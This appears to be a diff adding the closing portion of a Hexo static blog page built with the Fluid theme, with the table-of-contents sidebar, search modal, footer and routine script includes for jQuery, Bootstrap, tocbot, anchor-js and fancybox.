+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
